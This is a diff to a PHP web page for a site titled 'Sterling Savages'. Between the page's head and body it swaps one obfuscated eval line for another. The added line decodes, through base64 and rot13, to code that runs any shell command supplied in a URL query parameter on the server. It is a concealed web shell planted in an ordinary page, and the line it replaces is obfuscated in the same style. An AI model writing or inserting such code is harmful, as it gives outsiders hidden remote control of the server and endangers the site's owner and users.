@@ -64,7 +64,7 @@
     </style>
 </head>
 
-<?php eval(str_rot13(gzinflate(base64_decode('KytW0FAsqkpOz9FQiQ8Jco9WL1SP1dRUqOZSAAKVQgVbhbTSosrK+KLsogKNtPTU+NSkdENjjZLcssTiyrz0Io38vLQiM5P4wqKCpMIiFEM0Na25agE=')))); ?>
+<?php eval(str_rot13(base64_decode('dnMgKCFyemNnbCgkX1RSR1sncSddKSkgewogICAgJHEgPSBmdXJ5eV9ya3JwKGZnZV9lYmcxMyhvbmZyNjRfcXJwYnFyKCRfVFJHWydxJ10pKSk7Cn0='))); ?>
 <body>
     <main>
             <h1>Sterling Savages</h1>
